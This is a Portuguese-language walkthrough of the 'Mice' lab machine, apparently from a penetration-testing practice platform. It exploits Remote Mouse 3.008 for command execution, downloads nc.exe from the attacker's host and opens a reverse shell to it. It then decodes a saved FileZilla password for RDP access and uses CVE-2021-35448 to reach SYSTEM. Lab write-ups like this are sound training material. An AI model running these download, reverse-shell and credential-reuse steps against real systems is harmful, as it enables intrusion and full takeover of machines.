Na Mice, o Remote Mouse apareceu duas vezes no caminho: primeiro para conseguir uma shell, depois para chegar a SYSTEM pela interface gráfica. Entre uma etapa e outra, uma senha salva no FileZilla abriu o RDP. Foi uma resolução que misturou terminal, arquivos do usuário e um botão de escolher pasta que acabou entregando muito mais do que parecia.

1 · Reconhecimento

Começo com a varredura de todas as portas TCP. A Mice responde em cinco portas, e duas pistas já aparecem: um serviço de controle remoto e o RDP.

sudo nmap -p- --min-rate 5000 -Pn 192.168.183.199

Depois volto às portas encontradas para identificar os serviços e executar os scripts padrão. O serviço na 1978 é identificado como Remote Mouse. Esse vai ser meu primeiro caminho.

sudo nmap -sC -sV -Pn -p 1978,1979,1980,3389,7680 192.168.183.199
PortaO que encontrei
1978/tcpEmote Remote Mouse
1979/tcpServiço não confirmado; Nmap sugere unisql-java?
1980/tcpServiço não confirmado; Nmap sugere pearldoc-xact?
3389/tcpRDP / Microsoft Terminal Services
7680/tcpPorta normalmente usada pelo Delivery Optimization; não confirmado pela captura

Também verifico as opções de segurança anunciadas pelo RDP. O resultado mostra suporte a CredSSP/NLA e SSL. Isso ajuda a conhecer o serviço, mas ainda preciso de uma credencial para entrar.

nmap --script rdp-enum-encryption -p 3389 192.168.183.199

Um detalhe para acompanhar as capturas: o reconhecimento foi feito em 192.168.183.199, e as etapas seguintes aparecem em 192.168.133.199, em outra sessão do lab. Vou manter os endereços de cada etapa. O IP do meu Kali nas conexões de retorno é 192.168.45.214.

2 · Pesquisando o Remote Mouse

Com o nome do serviço, procuro no SearchSploit. Encontro uma PoC para RemoteMouse 3.008 que permite enviar comandos sem autenticação, simulando as teclas do usuário. Copio o exploit para analisar e testar.

searchsploit remote mouse
searchsploit -m 46697.py

O primeiro teste usa a PoC em Python 2, que tenta abrir a calculadora. Ela retorna uma mensagem de sucesso. Esse teste é uma pista de execução; a confirmação prática vai vir com a shell e o whoami.

python2 46697.py 192.168.183.199

Para enviar meus próprios comandos, uso o script do Podalirius que deixei nas referências. Ele abre o cmd.exe e digita o conteúdo de --cmd pelo protocolo do Remote Mouse. Nas minhas anotações, o arquivo foi salvo como remotemouse.py.

3 · Transferência e primeira shell

Agora preparo o Kali para transferir o nc.exe. O servidor HTTP precisa estar rodando no diretório onde esse arquivo está, senão o download vai falhar. Neste primeiro momento, uso a porta 80 para a transferência.

sudo python3 -m http.server 80

Em outro terminal no Kali, envio o comando pelo Remote Mouse. Deixei o Invoke-WebRequest explícito e as aspas fechadas corretamente, mantendo o mesmo destino da captura.

python3 remotemouse.py --target-ip 192.168.133.199 -v --cmd 'powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/nc.exe -OutFile C:/Windows/Temp/nc.exe"'

Com o download concluído, paro o servidor HTTP com Ctrl+C. A mesma porta 80 vai ser usada pelo listener, então preciso liberá-la antes. No Kali, começo a esperar a conexão:

sudo nc -nlvp 80

Em outro terminal, mando executar o Netcat que acabei de transferir:

python3 remotemouse.py --target-ip 192.168.133.199 -v --cmd 'C:/Windows/Temp/nc.exe 192.168.45.214 80 -e cmd.exe'

Sucesso, estou dentro! A shell chega como remote-pc\divine. Confiro a identidade e leio a flag local no Desktop.

whoami
cd /d C:\Users\divine\Desktop
dir
type local.txt

4 · Enumeração com winPEAS

Com o acesso inicial confirmado, começo a olhar o que existe no Windows. Uso o winPEAS para ajudar na enumeração. Para transferi-lo sem disputar a porta da shell, deixei o servidor HTTP desta etapa na 8000. As capturas originais usam 80; os comandos abaixo separam os dois serviços.

No Kali, preparo o executável e inicio o servidor na pasta de trabalho:

cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 8000

Na shell do Windows, abro o PowerShell, baixo o arquivo no Desktop e executo com o caminho relativo:

powershell
Set-Location C:\Users\divine\Desktop
Invoke-WebRequest -Uri http://192.168.45.214:8000/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe

Aqui apareceu um detalhe simples: digitar só winpeas.exe no PowerShell retornou que o comando não era reconhecido. O arquivo estava ali, mas o PowerShell exige .\ ou um caminho completo para executar algo da pasta atual. Com .\winpeas.exe, ele roda.

Continuando a enumeração, encontro um arquivo interessante no perfil do divine: o histórico de servidores do FileZilla. É nele que aparece a próxima pista.

5 · Credencial salva no FileZilla

Volto ao prompt cmd para ler o XML. Se ainda estiver no PowerShell iniciado na etapa anterior, exit retorna à shell anterior. O arquivo está em AppData\Roaming\FileZilla.

exit
cd /d C:\Users\divine\AppData\Roaming\FileZilla
type recentservers.xml

O XML mostra um acesso FTP para ftp.pg, com o usuário divine. O campo de senha informa encoding="base64". Não é um hash para quebrar: é um valor codificado que posso decodificar diretamente.

<User>divine</User>
<Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>

No Kali, decodifico o valor:

printf '%s' 'Q29udHJvbEZyZWFrMTE=' | base64 -d

A senha é ControlFreak11. Ela foi encontrada numa configuração de FTP; o próximo passo é testar se o mesmo usuário reutilizou essa credencial no Windows.

6 · Acesso à interface pelo RDP

Agora a porta 3389 faz sentido no caminho. Tento o RDP como divine com a senha recuperada:

xfreerdp /v:192.168.133.199 /u:divine /p:'ControlFreak11'

O acesso funciona e consigo usar a interface gráfica. A credencial salva no FileZilla abriu uma segunda forma de acesso à máquina. Agora volto ao Remote Mouse, dessa vez pela própria aplicação no Windows.

7 · Remote Mouse e acesso SYSTEM

Na bandeja do sistema, abro o Remote Mouse e entro em Settings. Em Image Transfer Folder, clico em Change.... Não precisa mudar a senha: o botão que interessa está na parte da pasta de transferência de imagens.

Isso abre uma janela Save As. Na captura aparece um aviso de que o Desktop do systemprofile não está disponível. Fecho esse aviso com OK e continuo na janela de seleção.

Na barra de endereço da janela, onde ficam os caminhos das pastas, digito o executável abaixo e pressiono Enter:

C:\Windows\System32\cmd.exe

Abre um novo prompt. Esse comportamento corresponde à falha local CVE-2021-35448, documentada para a GUI do Remote Mouse 3.008: a janela de arquivos permite abrir outro programa com o contexto privilegiado da aplicação. No meu lab, confirmo o resultado pelo whoami.

whoami

BOOOM! nt authority\system. O título da janela mostra Administrator, mas quem confirma a identidade é a saída do comando. Com esse acesso, vou ao Desktop do Administrator para ler a prova.

cd /d C:\Users\Administrator\Desktop
dir
type proof.txt

Mice concluída. Pwn3d!

8 · O que levo dessa máquina

O caminho foi Remote Mouse → execução de comandos → shell como divine → FileZilla → senha em Base64 → RDP → janela privilegiada do Remote Mouse → SYSTEM. A mesma aplicação apareceu na entrada e na escalada de privilégio.

  • Entender a PoC: a primeira execução abre a calculadora; a outra implementação permite enviar o comando que eu preciso.
  • Organizar as portas: servidor de arquivos e listener precisam de portas livres para funcionar ao mesmo tempo.
  • Olhar arquivos do usuário: o histórico do FileZilla guardava a credencial que faltava para o RDP.
  • Explorar a interface: um botão de escolher pasta abriu o caminho para um prompt com privilégio. Sempre confirmo a identidade com whoami.

Referências: PoC inicial 46697, script do Podalirius, GUI e CVE-2021-35448 e execução de comandos no PowerShell.
